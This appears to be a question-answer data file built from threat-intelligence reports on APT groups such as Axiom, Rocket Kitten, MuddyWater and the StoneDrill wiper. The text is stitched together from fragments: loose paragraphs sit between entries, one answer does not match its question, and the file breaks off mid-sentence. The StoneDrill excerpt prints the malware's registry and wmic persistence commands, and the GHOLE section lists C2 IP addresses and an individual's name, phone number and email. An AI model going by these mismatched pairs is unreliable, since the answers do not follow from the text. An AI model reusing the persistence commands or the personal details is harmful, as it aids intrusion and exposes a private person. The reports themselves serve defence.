    "instruction": "Big Headline: This post was authored by .\nMalware sandboxes are automated dynamic analysis systems that execute programs in a controlled environment. Within the large volumes of samples submitted daily to these services, some submissions appear to be different from others and show interesting characteristics. At I presented a in which we proposed a method to automatically discover malware developments from samples submitted to online dynamic analysis systems. The research was conducted by dissecting the sandbox dataset which consisted of over 30M samples collected in six years. The methodology we proposed was effective and we were able to detect many interesting cases in which the malware authors directly interacted with the sandbox during the development phase of the threats.\nAnother interesting result that came from the research concerns the samples attributed to Advanced Persistent Threat (APT) campaigns. Surprisingly, some of the malware samples used in these sophisticated attacks had been submitted to the Anubis sandbox months -- sometimes even years -- before the attack had been attributed to the proper APT campaign by a security vendor. To be perfectly clear, we are not saying that it took security vendors months or years to detect a threat. Most times, we are able to detect the threats in no more than a few hours. It is just that the malware samples were mislabeled and not properly associated with APT campaigns. In general, the same goes for non-APT malware campaigns. In this blog post, we tried to see if the same applied to the Cisco dataset. Speci cally, we chose ten APT campaigns, -- some of which were already covered in the Usenix paper. We decided to inspect two different datasets: our incoming sample feeds / malware zoo, and the telemetry associated with our Advanced Malware Protection (AMP) solutions. Talos receives samples from over 100 external feeds ranging from anti-malware companies to research centers, while the AMP dataset\ncontains telemetry from the Cisco user-base.\nThe remaining part of this post is organized as follows. First, we show the APT campaigns we investigated. Second, we summarize the results of the analysis of the Talos dataset. Third, we show the results from the AMP dataset.

Other instances of exploit\t\n \u00a0code have been observed, and the volume is increasing. On Feb 2, 2016 there were only 42 recognized samples of this exploit\t\n \u00a0code found in Virus Total. As of March 30, the number has tripled to 128. Of the observed samples, the first\t\n \u00a0submission\t\n \u00a0was from August\t\n \u00a04, 2015 and the most\t\n \u00a0recent\t\n \u00a0is from March 22, 2016.

    "output": "The Four Element Sword builder utilized multiple vulnerabilities in the same RTF document to ensure successful exploitation across different targets. Some targets might require newer exploit code due to updated systems, while others with outdated equipment could still be vulnerable to older exploits. This strategy allows the actors to use only the necessary amount of force to achieve their objectives without burning zero-day exploits or advanced techniques unnecessarily. By tailoring the exploits to the target's defenses, the actors maximize their chances of success while conserving resources.",

However, cyber security, especially at the national level, is a strategic game, and Kyiv can make smart investments that will pay off over the long run.\nCyber security, especially at the national level, is a strategic game.\nThis chapter has argued for the need to apply strategic thought to digital defence. It began by advocating the utility of a military model in cyberspace, albeit without any desire for the militarisation of cyberspace. The author explained how the military mind set, based on conflict with dynamic, adaptive adversaries, is a more reliable strategy than the popular 'cyber hygiene' model. It then described the five levels of strategic thought, which link goals with policy, strategy, campaigns and operations, tactics, and tools. The author applied each level of strategic thought to a hypothetical network defence scenario. By integrating strategic thought into digital defence, this chapter demonstrated an alternative to technology-centric approaches that are not sufficient to defeat the adversary.\nIn a time of war, Ukraine is a natural target for many cyber threat actors and campaigns. The only way to counter them is to develop an equally determined defensive posture in cyber space.\nAnswer this question: Why is it essential for Ukraine to adopt a military mindset in its approach to cybersecurity, particularly in the context of its ongoing conflict with Russia? How does this mindset differ from the 'cyber hygiene' model, and what are the key levels of strategic thought that should be integrated into digital defense?",
    "output": "Adopting a military mindset in cybersecurity is crucial for Ukraine because it involves preparing for conflict with dynamic, adaptive adversaries, which is more effective than the 'cyber hygiene' model. The military mindset focuses on conflict scenarios and strategic planning, whereas the 'cyber hygiene' model primarily emphasizes basic security practices. The key levels of strategic thought that should be integrated into digital defense include goals, policy, strategy, campaigns and operations, tactics, and tools. This structured approach helps in developing a comprehensive and proactive defense posture that goes beyond merely reacting to threats.",

To lure the victims to open the malicious attachment the email subject relevant to the victims were chosen and to avoid suspicion the email was made to look like it was sent by a person associated with IDSA asking to take action against a pending case as shown in the screen shot below.\nIn the second wave of attack, a spear-phishing email containing a different malicious excel file (Contact List of attendees.xls) was sent to an email id on the same day February 21st, 2017. The email was made to look like a person associated with IDSA is asking to confirm the phone number of an attendee in the attendee list. When the victim opens the attached excel file it drops the malware and displays a decoy excel sheet containing the list of names, which seems be the names of senior army officers. Even though the identity of the recipient email could not be fully verified as this email id is nowhere available on the internet but based on the format of the recipient email id and from the list of attendees that is displayed to the victim in the decoy excel file, the recipient email could be possibly be associated with either the Indian Army or a Government entity. This suggests that attackers had prior knowledge of the recipient email id through other means.\nIn both the cases when the victims opens the attached malicious excel file the same malware sample was dropped and executed on the victim's system.

    "instruction": "Big Headline: Tactics, Techniques, and Procedures of Axiom\nA wide range of mechanisms are used to reach the stage of an operation where Hikit is deployed. Observed methods include the traditional use of spear phishing, leveraging of generic and strategic website compromises, and targeted attacks against public facing infrastructure. One of the many disturbing attributes of Axiom and their affiliated groups is their ability to create and leverage large pools of compromised machines, sift through them to identify the organizations of interest, and quickly (within hours or days) begin secondary follow-up exploitation operations. This rapid transition from identification to action on the objective demonstrates the level of sophistication and focus of these actors; it also suggests an integrated targeting element, with possible inputs from an authoritative tasking entity, which is responsible for issuing dynamic taskings. This modus operandi does not suggest that Axiom relies solely upon casting a large net for victimization, rather that the Axiom actors have a well-established tradition and capabilities that support focused targeting of both individuals and organizations.\nOnce inside an enterprise, Axiom begins reconnaissance almost immediately to establish where they are in the target's network, and to identify any changes that have been made to the environment. Once this initial reconnaissance stage has been completed and the information is collected, Axiom typically moves quickly to escalate privileges on compromised machines via previously compromised administrative accounts, local exploits, or remote exploits as demonstrated in the ZoxRPC malware. This escalation of privileges is typically in an attempt to dump the latest credentials they can gain access to on the victim network. This information is quickly accessed, compressed, encrypted, and exfiltrated by the actors. The turnaround for the use of this information after collection can vary from minutes to months.\nThe Axiom threat actor group has also demonstrated the operational flexibility of leveraging systems administration tools available within targeted organizations (e.g., Remote Desktop Protocol (RDP), remote administration tools). It has been observed several times that Axiom operators have even leveraged these capabilities as a means of maintaining additional persistence via setting \"sticky keys\" for RDP sessions. They also use custom tools containing network and local exploits, hacking utilities, and legitimate security tools for privilege escalation and lateral movement. By leveraging tools already available within a target organization Axiom, can forgo the need to potentially raise their profile by deploying additional malware that may trigger antivirus or IDS indicators. As a typical scenario when compromising an organization, this actor group will aim to orient themselves, move laterally, escalate privileges, dump\ncredentials, and install other families of malware to hedge against detection of any one variant of their malware.\nIt has been observed in many of Axiom's victim environments that the total number of malware families leveraged can exceed four separate \"layers\" of malware. These families of malware range in uniqueness from extremely common (Poison Ivy, Gh0st, ZXshell) to more focused tools used by Axiom and other threat groups directed by the same organization (Derusbi, Fexel) to tools only seen used by Axiom (ZoxPNG/ZoxRPC, Hikit). This is likely done to ensure a certain level of persistence and redundant command and control should one of the families ever become compromised. Additionally, once into later stages of their operations, Axiom operators will create and deploy shell utilities that are customized to the operational environment. Operators will also install data archival and compression tooling that may not already exist on the target machine. The flexibility and fluency of Axiom's toolset, including the ability to produce custom tools, is yet another indicator of the technical and operational sophistication of this entity.\nIn support of this flexible tooling capability, Axiom has demonstrated a relatively sophisticated use of large amounts of legitimate and compromised internet infrastructure. Axiom has been observed grooming and leveraging an array of compromised proxy infrastructure within the United States, South Korea, Taiwan, Hong Kong, and Japan. Novetta has observed indications in various datasets that this compromised infrastructure can be created per campaign or target, or can be shared within a cluster of related targets. It is surmised that this method is a means to create confusion for any investigation into activity related to an Axiom intrusion, by leveraging the capabilities of Axiom tools and interweaving legitimate traffic to the same IP address during the compromise. The net effect of this tactic is to create a set of network traffic that at first glance appears to be legitimate traffic.\nBeyond this generally stealthy technique for hiding malicious traffic, the ability to have access to a continual pool of compromised infrastructure in which to overlay their operations speaks to the ability of Axiom actors. They do not just comprise various Internet facing platforms, but also have the organizational ability to deal with the capture, grooming, and maintenance of a large set of compromised infrastructure while in parallel executing technical operations and creating new targeting information for pursuit. On top of Axiom's usage of compromised infrastructure they also maintain supporting infrastructure accounts, such as dynamic DNS services, and VPS/hosting providers from a variety of United States and Chinese providers. This ability to leverage both compromised and legitimate infrastructure enables Axiom to adjust to a target's security posture and potentially extend their access to a targeted organization.\nMedium Headline: Victim Life Cycle\nBased on observed victim environments infiltrated by Axiom, Novetta believes that there are at least six separate tiers of responsibilities that service different stages of the victim lifecycle.\nAxiom, for its part, largely conducts operations in later stages of the overall victim compromise. Currently, we believe that the victim lifecycle is split into the following stages:\n\u25cf Stage 0: Target identification and reconnaissance\n\u25cf Stage 1: Initial access, validation and internal target reconnaissance\n\u25cf Stage 2: Lateral movement, and creation of additional footholds\n\u25cf Stage 3: Compromised infrastructure creation and grooming\n\u25cf Stage 4: Stealthy identification and exfiltration of targeted data\n\u25cf Stage 5: Maintain access and understanding of environment\nThe level of sophistication seen by this multistage life cycle implies a number of things about the adversary's ability to command resources and coordinate within itself. It is this structure and coordination that truly sets Axiom and its associated groups apart from other actors in this space.\nMedium Headline: Structure of Adversary\nWe also assess that different groups associated with the Axiom threat actor group likely perform various phases. This deduction is supported by the number of differences in the observed activity during these compromise stages which suggest a number of separate teams with varying responsibilities during their operation lifecycle. For instance, examinations of differences in command and control (C2) and midpoint proxy infrastructure displayed by the Stage 1, Stage 2 and Stage 4 binaries have led us to believe that the operational tempo, security policies, and acceptable risk levels are drastically different. This coordination of different operators, infrastructure, and tools between stages in the same environment suggests a common operating picture within a large organization.\nIt cannot be overstated that the operational timelines observed imply that Axiom and other stage operators operate with a cohesive long-term strategic goal. The ability of any organization to consider strategic objectives over a multi year period implies that organization both believes that their operations will have far reaching effects, and that the organization itself will exist for an extended time. Extended operations require meaningful resources, both in terms of financial capital (salaries), as well as physical resources (money for VPS's and traditional server infrastructure), as well as a logistic overhead for coordinating, planning, and researching attack vectors, creation/purchasing and distribution of 0-day exploit code and associated exploit frameworks34, and campaign coordination between subgroups.\nFinally, threat actors at all the described stages, including Axiom, display a clear level of discipline in using their compromised resources. There is no meaningful level of information leakage due to resource access, or due to visiting personal websites with these resources. While this level of discipline has been observed outside of governmental organizations and\nfunded operations, it displays a level of familiarity with investigative and forensics operations that clearly sets them apart from the less sophisticated threat actors.\n34 http://www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks\n\nQ: What are the key stages of the victim lifecycle as observed in Axiom's operations, and how does this structure reflect the adversary's capabilities?",
    "output": "A: The victim lifecycle observed in Axiom's operations includes six stages: target identification and reconnaissance, initial access and internal target reconnaissance, lateral movement and creation of additional footholds, compromised infrastructure creation and grooming, stealthy identification and exfiltration of targeted data, and maintaining access and understanding of the environment. This multistage lifecycle reflects the adversary's ability to command resources and coordinate within itself, indicating a high level of sophistication and strategic planning.",

In September 2016, WADA confirmed they were the victim of a successful breach, which occurred over the summer of 2016, and purportedly attributed to APT28, as was reported in (<https://www.wada-ama.org/en/media/news/2016-09/wada-confirms-attack-by-russian-cyber-espionage-group>)WADA's press release on the attack. For those interested, ThreatConnect published an informative write up on this breach, entitled \"(<https://www.threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/>)Russian Cyber Operations On Steroids\", detailing the APT28 campaign targeting WADA.\nAnalysis\nOn January 14, 2017, the tr1adx team observed what we believe to be early stages of a new campaign targeting the World Anti-Doping Agency (WADA) or affiliates. A Threat Actor, following similar TTP's to those we have seen Russian Nation State Threat Actor APT28 use, has registered two domains which we assess may be used in further cyber attacks against the WADA or its affiliates. Additionally, in a move similar to TTP's described in ThreatConnect's \"(<https://www.threatconnect.com/blog/fancy-bear-anti-doping-agency-phishing/>)Russian Cyber Operations On Steroids\" report, we believe the Threat Actor may be preparing to launch, or has already launched a phishing campaign against their targets.\nIndicators of Compromise\nAnswer this question: Why did the tr1adx team attribute the new campaign targeting the World Anti-Doping Agency (WADA) to the Russian Nation State Threat Actor APT28? Explain the indicators and tactics, techniques, and procedures (TTPs) that led to this assessment.",
    "output": "The tr1adx team attributed the new campaign targeting the World Anti-Doping Agency (WADA) to the Russian Nation State Threat Actor APT28 based on several key indicators and TTPs. Firstly, the team observed that a threat actor had registered two domains which they assessed might be used in further cyber attacks against WADA or its affiliates. This tactic is consistent with previous behavior attributed to APT28. Additionally, the team noted that the threat actor appeared to be preparing to launch, or had already launched, a phishing campaign against their targets. This phishing strategy aligns with the TTPs described in ThreatConnect's report titled 'Russian Cyber Operations On Steroids,' which detailed APT28's campaign targeting WADA. These similarities in methodology and tactics strongly suggested that APT28 was behind the new campaign.",

    "instruction": "Context: up to the 2008 Olympic Games in Beijing. Shady rat's activity continued to build in 2008, when it infiltrated the networks of 36 organizations, including the United Nations\u2014and reached a crest of 38 organizations, including the World Anti-doping Agency, in 2009. Since then, the victim numbers have been dropping, but the activity continues. Shady rat's command-and-control server is still operating, and some organizations, including the World Anti-doping Agency, were still under attack as of last month. (As of Tuesday, according to a WADA spokesman, the group was unaware of any breach, but \"WADA is investigating\" McAfee's discovery.) The longest compromise duration\u2014\"on and off for 28 months,\" according to McAfee's report\u2014 was one Asian country's Olympic committee. Many others were compromised for two full years. Nine organizations were compromised for one month or less. All others were compromised for a minimum of one month, potentially allowing for complete access to all data on their servers.\nAlperovitch says that McAfee is \"working closely with U.S.government agencies, a variety of them, law enforcement and others,\" in hopes of eventually shutting down Shady rat's command-and-control server. (He declined to say whether U.S. intelligence agencies are involved in the investigation.)\nAlperovitch's diagnosis of the problem raised by Shady rat is troubling: \"It's clear from this and other attacks we've been witnessing that there is an unprecedented transfer of wealth in the form of trade secrets and I.P., primarily from Western organizations and companies, falling off the truck and disappearing into massive electronic archives. What is happening to this data? Is this being accumulated in a giant, Indiana Jones\u2013type warehouse? Or is it being used to create new products? If it's the latter, we won't know for a number of years. But if so, it's not just a problem for these companies, but also for the governments of the countries where these companies are located, because they're losing their economic advantage to competitors in other parts of the world overnight. That is a national-security problem, insofar as it leads to loss of jobs and lost economic growth. That's a serious threat.\"\nHis account of attempting to inform some of Shady rat's victims may be even more troubling. Some victims seem determined to deny they've been attacked, even when offered empirical proof that a smash-and-grab has taken place. Two weeks ago, McAfee sent e-mails to officials at four organizations, informing them that their computer networks had been compromised. To each, Alperovitch wrote, \"We would be glad to work with you and provide our assistance \u2026 to help you determine the impact of the intrusion \u2026 or how to prevent this type of infiltration in the future.\" Three of those organizations\u2014 including one whose breach is ongoing\u2014made no response to McAfee's notifications. Even after McAfee's second attempt to offer information about the breaches to two of the groups, Alperovitch says, they expressed no interest in learning details of the intrusions. The spokesman for one of those organizations, WADA, told me that he considered Alperovitch's first e-mail to be \"spam.\" He said, \"We are conducting our own investigation of the allegations.\" When asked why WADA chose not to accept McAfee's offer to provide detailed information that could help in that investigation, the spokesman answered, \"I am under no obligation to answer your questions about my investigation.\" (Later that day, according to McAfee, WADA did request information concerning the attack.)\n\"We've seen this before,\" Alperovitch says. \"Victims don't want to know they're victims. I guess that's just victim psychology: if you don't know about it, it's not really happening.\"\n\nQuestion: How does the prolonged duration of compromises, such as the 28-month compromise of an Asian country's Olympic committee by Operation Shady rat, affect the targeted organizations and their data? What strategies can be employed to detect and mitigate such long-term breaches?\n\nAnswer:",
    "output": "Prolonged compromises allow attackers extensive access to an organization's data, potentially leading to significant data theft and intellectual property loss. This can result in economic damages, loss of competitive advantage, and national security risks. To detect and mitigate long-term breaches, organizations can employ strategies such as regular security audits, continuous monitoring of network traffic, implementing advanced threat detection systems, and conducting regular incident response drills. Additionally, fostering a culture of open communication and cooperation with cybersecurity firms and government agencies can help in early detection and response to such threats.",

    "instruction": "Medium Headline: ViCtimS anD tarGetS\nThe content of the files we have collected from this group of attackers is quite straightforward. They contain information that is very customized in relation to the target entity. Some files are written in German, while others contain information specific to just one vertical. All of these have been used for spear-phishing emails against various targets.\nSeeing the content of these files, we suspect they have all been used for spear phishing against the following:\n\u2022 Civilian organizations in Israel\n\u2022 Academic organizations in Israel\n\u2022 German-speaking government organizations\n\u2022 European organizations\n\u2022 European private company\nAttack overview\nSmall Headline: The GHOLE Campaign\nIn February 2015, the Trend Micro\u2122 Smart Protection Network\u2122 received an alert from Europe that triggered several targeted attack indicators related to a specific malware family, prompting our threat defense experts to investigate further. The alert showed an infected Microsoft\u2122 Excel\u00ae file that soon proved to have been launched by Rocket Kitten. When a user opens the Excel file attachment in the spear-phishing attempt, a .DLL file is dropped onto the system and is executed using a macro embedded in the file. Macros are small scripts within files that are usually used to automate common repetitive tasks. However, these can also be used for malicious intent, such as infecting machines of unsuspecting users with malware, just like in this situation. Trend Micro detects the malware as TROJ_GHOLE.A. It is common for Rocket Kitten to use GHOLE in their targeted attack campaigns. The dropped .DLL file (SHA1 hash: 07a77f8b9f0fcc93504dfba2d7d9d26246e5878f; BKDR_GHOLE.B) is scanned on VirusTotal, but there were no results, raising further interest to analyze the binary. [2\u20123]\nThe .DLL file contained an export function named, \"function,\" instead of the usual, \"gholee,\" found in previous samples from this malware family. We suspect that the attacker did this on purpose so the malware can bypass detection and stay within the targeted system that would eventually give it more freedom to move laterally.\nVery Small Headline: Export Function: Function\nThe top-right boxed code in the screenshot, displayed to the right, shows an unusual code that uses \"push\" to pass values like those shown in the screenshots below it. When passed to WINAPI, it will look like a string on stack.\nThe first block contains the address of the command-and-control (C&C) server of the malware, which is located at IP address, 83.170.33.60. This value is specified in the code, as shown in the third screenshot.\nThe second boxed code in function, ZKXdu80x, is the client version. The third is an encryption key with a length of 256 bytes (2,048 bits) used for network communications, and starts with the pattern, GET /index.php?c=xxxxxxxx&r=xxxxx&u=1&t=.\nIn all samples we have analyzed, the \"c\" argument is 8 bytes long and differs across variants. This can be used as a unique identifier for each of the infected machines. The \"r\" argument has a variable length, 5\u20137 bytes; the \"u\" argument is always 1 byte long.\nOther communication patterns can be found in the binary and can be used as indicators of compromise:\n\u2022 index.php?c=%s&r=%lx\n\u2022 index.php?c=%s&r=%lx&u=1&t=%s\n\u2022 index.php?c=%s&r=%x\nExport function, function\nUse of the \"push\" mnemonic to pass values in the code\nIP address\nVery Small Headline: rElatEd SamplES\nWe found several Microsoft Office\u00ae files containing variants of the GHOLE malware family that were used to infect machines. As the Excel spreadsheet used in this campaign is disguised to look relevant and important, users were prompted to open it and execute the embedded macro. The use of macros to infect computers is deemed amateur. This shows that there is a gap between the maturity of the malware, which is good enough for its purpose, and the way it is delivered, which raises questions about the attackers' professional capacity.\nWe decided to look at the spear-phishing attempts from a wider perspective and analyzed more samples from this malware family. Based on available evidence, only the Rocket Kitten group is known to have used GHOLE in the attacks related to Operation Woolen-GoldFish. It is interesting to note that the GHOLE malware is in fact a modified CORE IMPACT\u00ae product. CORE IMPACT is a sophisticated penetration-testing tool from CORE, a legitimate company. [4]\nSample content from a malicious Office file after running the macro; the content is common and publicly available on the Internet\nSample content from malicious Microsoft Office files; the attacker needs the user to enable the macro to infect the computer\nAfter studying the sample infected and dropped files, we established a timeline using the dates when the executable files were compiled. This timeline should be reliable unless the attackers played with the time stamps, which would be surprising in this campaign since all binary compilation dates fit quite well with the spear-phishing attacks.\nAs is often the case with malware families specifically used in targeted attacks, there are actually very few different samples in the wild, compared with traditional cybercrime malware.\nNumber of malware samples compiled\nThe Microsoft Office files used by the attackers to infiltrate their targets' networks are also very interesting because they contain metadata. Metadata can be defined as \"the information about the information,\" which in this case is the information pertaining to the file itself. Some of details of the available metadata were useful, particularly, the creation date, modification date, author, and last modification author. We will tackle the metadata later on in this paper.\nVery Small Headline: uSE oF malwarE ScannEr\nDuring the course of this investigation, we found out that some samples of the GHOLE malware have been submitted to an online-malware-scanning site, av.zerodays.ir, to estimate the detection rate of their malware. [5] Three samples appeared to have been scanned using this service before they appeared elsewhere. One sample was submitted 26 days before it was scanned in other online malware analysis service sites. This led us to believe that the malware controllers submitted the original samples to the av.zerodays.ir system themselves. We would like to point out that the av.zerodays.ir online service is free and available to everyone on the Internet. We contacted a representative of the company, who in turn told us that they \"do not condone cybercrime or in any way affiliated to any entity that could have been part of this campaign.\"\nVery Small Headline: GHolE malwarE communication and control\nThe communications established by this malware family from an infected workstation to the C&C server are done by directly communicating with the IP addresses hard-coded in the binaries, as seen in the export function display. There were no domain names involved in this campaign. We were able to obtain a list of C&C servers, which are mostly hosted in Germany, via a satellite communication service provider known as Industrieanlagen-Betriebsgesellschaft mbH (IABG): [6]\n\u2022 83.170.33.37\n\u2022 83.170.33.60\n\u2022 83.170.43.67\n\u2022 83.170.33.80\n\u2022 84.11.26.230\n\u2022 84.11.75.220\n\u2022 84.11.146.55\nThe last IP address, 84.11.146.55, was associated with one malware sample.

These IP addresses also belonged to IABG and could all be connected to the same customer. In fact, all of the IP ranges on which these C&C servers are identified belonged to one customer, who rents the following IP ranges from IABG:\n\u2022 84.11.26.224\u201384.11.26.255\n\u2022 84.11.37.128\u201384.11.37.159\n\u2022 84.11.75.192\u201384.11.75.255\n\u2022 83.170.33.32\u201383.170.33.63\n\u2022 83.170.33.64\u201383.170.33.95\n\u2022 83.170.43.64\u201383.170.43.95\nperson: Mehdi Mahdavi address: No 83 - Baharestan st address: Isfahan address: IR phone: +98 913 115 8009 email: mahdavi@livenetsat.com\nRegistration for the livenetsat.com domain used here expired in 2010.

    "instruction": "Context: Big Headline: Introduction\nThe details of organized cyber-espionage campaigns are becoming more public. So-called \"(<http://www.secureworks.com/cyber-threat-intelligence/advanced-persistent-threats/>)Advanced Persistent Threat\" (APT) attacks are common news as individuals and corporations discover the data on their hard drives is part of a country or competitor's \"shopping list.\" The actors behind these attacks are generally well-equipped in terms of training, finances, and access to resources. The missions of APT threat actors are usually of strategic importance, and the actors exercise virtually unlimited patience in penetrating and persisting inside their specific target's network until they accomplish their goals.\nOne of the universal aspects of APT attacks is the use of malicious software tools that grant unauthorized backdoor access to computer systems inside the targeted network. Because maintaining a beachhead inside the network is often critical to mission success, threat actors must adapt to various network configurations and changes in defenses by choosing and deploying backdoors with specific functionality and features. It is difficult to be persistent without at least one backdoor. Threat actors often possess and use an arsenal of remote access trojans (RATs) to siphon data from their targets. Persistence requires malware, and the top cyber-espionage actors have hundreds of RATs at their disposal at any given time. Understanding the choice and usage of tools can be the keys to identifying and tracking APTs.\nple names make the automated tracking of these tools by AV companies difficult. This inaccuracy can be detrimental when designing defenses based on specific threat indicators. Tracking APTs requires a dedicated malware intelligence effort. One way applied malware intelligence is used to discover new APT trojans is a recursive investigative method: Malware -> Infrastructure Touchpoints -> New Malware -> and so on.\nCyber-espionage actors often cycle through different RATs over a period of years. The Dell SecureWorks (<http://www.secureworks.com/cyber-threat-intelligence/counter_threat_unit/>)Counter Threat Unit\u2122 (CTU) research team has tracked a RAT known as \"Comfoo\" that has been in continuous development since at least 2006. This RAT has maintained a fairly low profile, even though it was used as part of the RSA breach in 2010, when its code was first analyzed. Antivirus firm Trend Micro briefly (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_luckycat_redux.pdf>)mentioned its use in a 2012 paper titled \"Luckycat Redux \u2014 Inside an APT Campaign with Multiple Targets in India and Japan.\" However, the disclosure of this trojan and some of its command and control (C2) infrastructure did not discourage its continued use by the threat actors responsible for it.\nAnswer this question: Why is it crucial for APT threat actors to maintain a beachhead inside the targeted network, and how does the choice of backdoors contribute to their persistence?",
    "output": "It is crucial for APT threat actors to maintain a beachhead inside the targeted network because the missions of these actors are usually of strategic importance, requiring unlimited patience and persistence until they accomplish their goals. The choice of backdoors contributes to their persistence by allowing them to adapt to various network configurations and changes in defenses. Backdoors with specific functionality and features enable the actors to continue their operations despite evolving security measures.

These threat actors are considered extremely motivated and persistent when it comes to targeting victims across the globe.\nTalos disclosed a MuddyWater (<https://blog.talosintelligence.com/2022/01/iranian-apt-muddywater-targets-turkey.html>)campaign in January targeting Turkish entities that leveraged maldocs and executable-based infection chains to deliver multistage, PowerShell-based downloader malware. This group previously used the same tactics to target other countries in Asia, such as Armenia and Pakistan.\nIn our latest findings, we discovered a new campaign targeting Turkey and the Arabian peninsula with maldocs to deliver a Windows script file (WSF)-based remote access trojan (RAT) we're calling \"SloughRAT\" an implant known by \"(<https://www.cisa.gov/uscert/ncas/alerts/aa22-055a>)canopy\" in CISA's most recent alert from February 2022 about MuddyWater.\nThis trojan, although obfuscated, is relatively simple and attempts to execute arbitrary code and commands received from its command and control (C2) servers.\nOur investigation also led to the discovery of the use of two additional script-based implants: one written in Visual Basic (VB) (late 2021 - 2022) and one in JavaScript (2019 - 2020), which also downloads and runs arbitrary commands on the victim's system.\nMuddyWater's variety of lures and payloads \u2014 along with the targeting of several different geographic regions \u2014 strengthens our growing hypothesis that MuddyWater is a conglomerate of sub-groups rather than a single actor. These sub-groups have conducted (<https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html>)campaigns against a variety of industries such as national and local governments and ,  and private entities such as . While these teams seem to operate independently, they are all motivated by the same factors that align with Iranian national security objectives, including espionage, intellectual theft, and destructive or disruptive operations based on the victims they target.\nA variety of campaigns analyzed are marked by the development and use of distinct infection vectors and tools to gain entry, establish long-term access, siphon valuable information and monitor their targets. The MuddyWater teams appear to share TTPs, as evidenced by the incremental adoption of various techniques over time in different MuddyWater campaigns. We represent this progression in a detailed graphic in the first main section of this blog.\n\nWhat are the primary motivations and objectives of the MuddyWater APT group, and how do their activities align with broader national security interests?",
    "output": "The primary motivations and objectives of the MuddyWater APT group align closely with Iranian national security interests. Their activities include espionage, intellectual theft, and destructive or disruptive operations. They target a variety of industries such as national and local governments, as well as private entities. By conducting campaigns against these targets, MuddyWater aims to gather sensitive information, disrupt operations, and further Iranian strategic goals. The group's persistence and adaptability, as seen in their varied tactics and tools, underscore their commitment to achieving these objectives. Understanding these motivations helps cybersecurity professionals anticipate potential targets and tailor their defensive strategies accordingly.",

    "instruction": "Small Headline: 2.6.4. Fourth step: Payload injection\nThe payload is extracted from the resources section, decrypted and unpacked similarly to the previously described wiper injector module. The difference here is that for the decryption of the payload module, SSE instructions are used.\nIn the same style, the payload is injected into the user preferred browser process, with an additional step after the payload module injection: the resource segment responsible for the payload configuration is replaced in memory with the resource taken from the parent module.\nAfter the payload start is attempted, the VBS files listed inside C-Dlt-C-Trsh-T.tmp and C-Dlt-C-Trsh-T.tmp are deleted.\nSmall Headline: 2.7.1. First step: Decryption\nStrings in this module are encrypted by ROR, NEG, ADD or simply XOR. An unreliable anti-emulation technique is utilized which makes the whole module unstable. The author assumed that the execution of the Sleep function with parameter 4020 milliseconds would increase the system value of KUSER_SHARED_DATA::InterruptTime to four seconds (rounded to the\nnearest second). If the InterruptTime is increased only by two seconds this module just exits immediately. In case of other values, the module will crash due to the incorrect decryption of strings.\nThe configuration block is then loaded from resources and decrypted by two passes of XOR.\nThe original module configuration resource is empty - the injector module just patches this resource, replacing the configuration with its own. In the configuration block, \"ux\" and \"uy\" are the C&C servers, \"Cid\" is part of the connection query and seems to be a client ID.\nSmall Headline: 2.7.2. Second step: Registering autorun of installer (injector) module\nThe malware reads and de-XORs content of the\nC:\\ProgramData\\InternetExplorer\\FileInfoStp.txt file, then deletes and unregisters the autorun file defined in FileInfoStp.txt (autorun key deleted from registry) with the command:\ncmd /c REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Stp /f\"\nNext, the file C:\\ProgramData\\InternetExplorer\\FileInfoStp.txt is deleted and replaced by the command:\ncmd /c Copy /Y \"C:\\ProgramData\\Chrome\\FileInfo.txt\" \"C:\\ProgramData\\InternetExplorer\\FileInfoStp.txt\"\nThe malware then drops and executes file %TEMP%\\C-Strt-C-Up-T.bat\nping 1.0.0.0 -n 1 -w 20000 > nul\n@ECHO OFF\nwmic /NameSpace:\\\\root\\default Class StdRegProv Call SetStringValue hDefKey = \"&H80000001\"\nsSubKeyName = \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" sValue =\n\"C:\\ProgramData\\InternetExplorer\\%SELECTED_NAME%Stp.exe\" sValueName = \"Stp\"\nDel \"%TEMP%\\C-Strt-C-Up-T.bat\"\nMedium Headline: 2.8. StoneDrill similarities with Shamoon\nOf course, one of the most important questions is the following: are StoneDrill and Shamoon connected? This is a difficult question to answer. However, by listing the similarities and differences between the two, anyone can come up with their own answer.\nAlthough we used a Yara built on Shamoon samples to find StoneDrill, there are several other similarities between the two:\n\u25cf Both Shamoon and StoneDril appear to be targeting Saudi organizations.\n\u25cf Samples have been compiled around the same time - October-November 2016.\n\u25cf Similar to previous generations of Shamoon, StoneDrill uses encrypted PE resources to store the actual payload.\nThe most important differences include:\n\u25cf To avoid detection by emulators and sandboxing tools, the StoneDrill authors used far more advanced anti-emulation techniques than Shamoon.\n\u25cf StoneDrill utilises VBS scripts to run self-delete scripts, while Shamoon didn't use any external scripts.\n\u25cf A distinction from the Shamoon malware is that the strings encryption in StoneDrill is performed by alphabet table replacement.\n\u25cf StoneDrill does not use drivers during deployment, but rather through memory injection into the victim's preferred browser.\nMedium Headline: 2.9. StoneDrill similarities with NewsBeef\nOur initial analysis of StoneDril revealed some similarities with a threat actor we've seen before - NewsBeef. While we call this the NewsBeef APT, this group has been reported in the past as Charming Kitten or Newscaster (in 2014).\nThe similarities between NewsBeef and StoneDrill make us believe there is a very strong connection there. Below we list some of the similarities we observed:\nBig Headline: 3. Conclusions\nOur discovery of StoneDrill gives another dimension to the existing wave of wiper attacks against Saudi organizations that started with Shamoon 2.0 in November 2016. Compared to the new Shamoon 2.0 variants, the most significant difference is the lack of a disk driver used for direct access during the destructive step. Nevertheless, one does not necessarily need raw disk access to perform destructive functions at file level, which the malware implements quite successfully.\nOf course, one of the most important questions here is the connection between Shamoon and StoneDrill. Both wipers appear to have been used against Saudi organizations during a similar timeframe of October-November 2016. Several theories are possible here:\n\u25cf StoneDrill is a less-used wiper tool, deployed in certain situations by the same Shamoon group.\n\u25cf StoneDrill and Shamoon are used by different groups which are aligned in their interests.\n\u25cf StoneDrill and Shamoon are used by two different groups which have no connection to each other and just happen to target Saudi organizations at the same time.\nTaking all factors into account, our opinion is that the most likely theory is the second.\nAdditionally, StoneDrill appears to be connected with previously reported NewsBeef activity, which continues to target Saudi organizations. From this point of view, NewsBeef and StoneDrill appear to be continuously focused on targeting Saudi interests, while Shamoon is 